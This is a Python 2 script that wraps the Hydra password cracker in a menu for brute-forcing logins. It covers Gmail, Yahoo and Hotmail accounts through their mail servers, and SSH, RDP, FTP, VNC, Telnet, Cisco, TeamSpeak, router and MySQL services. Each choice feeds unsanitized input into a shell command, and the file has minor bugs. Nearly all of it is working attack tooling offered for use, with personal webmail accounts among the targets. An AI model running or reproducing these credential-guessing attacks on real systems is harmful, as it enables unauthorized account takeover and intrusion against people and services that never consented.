#!/usr/bin/python
"""
This program is just a small program to shorten brute force sessions on hydra :)
But to be more satisfying results of the brute force. You better interact directly with hydra,
without having to use this black hydra console first: ').
If you find any errors in running our program. Can chat via facebook :).
Hydra is needed for the process of this program :).
"""
import sys, os, time

# Restart ####################
def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################

os.system("clear")

print "          _  _         _            ___          _       ___                "
print "         | || |_  _ __| |_ _ __ _  | _ )_ _ _  _| |_ ___| __|__ _ _ __ ___   "
print "         | __ | || / _` | '_/ _` | | _ \ '_| || |  _/ -_) _/ _ \ '_/ _/ -_)  "
print "         |_||_|\_, \__,_|_| \__,_| |___/_|  \_,_|\__\___|_|\___/_| \__\___|  "
print "               |__/                                                          "

print
print             ("-"*80)
print "                           Coded By :  1ucif3r"
print "                          Instagram :  https://www.instagram.com/th3_1ucif3r/"
print             ("-"*80)
print

print "                       ========|[ Hydra Brute Force ]|========"
print
print " 			   [01] Cisco Brute Force         "
print "  			   [02] VNC Brute Force           "
print "  			   [03] FTP Brute Force           "
print "    			   [04] Gmail Brute Force         "
print "  			   [05] SSH Brute Force           "
print "  			   [06] TeamSpeak Brute Force     "
print "  			   [07] Telnet Brute Force        "
print "  			   [08] Yahoo Mail Brute Force    "
print "  			   [09] Hotmail Brute Force       "
print "    			   [10] Router Speedy Brute Force "
print "  			   [11] RDP Brute Force           "
print " 			   [12] MySQL Brute Force         "
print
print " 			   [00] Exit"
print
hbf = raw_input("root@hydrabruteforce:~/# ")

if hbf == '01' or hbf == '1':
  print
  print "          +---------------------------+"
  print "          |     Cisco Brute Force     |"
  print "          +---------------------------+"
  print
  print
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -P %s %s cisco" % (word, iphost))
  sys.exit()
  
elif hbf == '02' or hbf == '2':
  print
  print "          +---------------------------+"
  print "          |      VNC Brute Force      |"
  print "          +---------------------------+"
  print
  print
  word = raw_input("[*] Wordlist : ")
  iphost = raw_input("[*] IP/Hostname : ")
  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
  iphost = raw_input("[*] IP/Hostname : ")
  
elif hbf == '03' or hbf == '3':
  print
  print "          +------------------------------+"
  print "          |        FTP Brute Force       |"
  print "          +------------------------------+"
  print
  print
  user = raw_input("[*] User : ")
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
  sys.exit()
  
elif hbf == '04' or hbf == '4':
  print
  print "          +------------------------------+"
  print "          |       Gmail Brute Force      |"
  print "          +------------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  sys.exit()
  
elif hbf == '05' or hbf == '5':
   print
   print "         +--------------------------------+"
   print "         |        SSH Brute Force         |"
   print "         +--------------------------------+"
   print
   print
   user = raw_input("[*] User : ")
   word = raw_input("[*] Wordlist : ")
   iphost = raw_input("[*] IP/Hostname : ")
   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
   sys.exit()
   
elif hbf == '06' or hbf == '6':
	print
	print "        +-------------------------+"
	print "        |  TeamSpeak Brute Force  |"
	print "        +-------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
	sys.exit()

elif hbf == '07' or hbf == '7':
	print
	print "        +-------------------------+"
	print "        |   Telnet Brute Force    |"
	print "        +-------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
	sys.exit()
	
elif hbf == '08' or hbf == '8':
  print
  print "          +---------------------------+"
  print "          |     Yahoo Brute Force     |"
  print "          +---------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
  sys.exit()
  
elif hbf == '09' or hbf == '9':
  print
  print "          +----------------------------+"
  print "          |    Hotmail Brute Force     |"
  print "          +----------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
  sys.exit()
  
elif hbf == '10':
	print
	print "        +-----------------------------+"
	print "        |  Router Speedy Brute Force  |"
	print "        +-----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
	sys.exit()
	
elif hbf == '11':
	print
	print "        +----------------------------+"
	print "        |      RDP Brute Force       |"
	print "        +----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
	sys.exit()
	
elif hbf == '12':
	print
	print "        +-----------------------------+"
	print "        |       MySQL Brute Force     |"
	print "        +-----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
	
elif hbf == '00' or bhydra == '0':
	print "\n[!] Exit the Program..."
	sys.exit()
	
else:
	print "\n[!] ERROR : Wrong Input..Please give the right one.."
	time.sleep(1)
	restart_program()
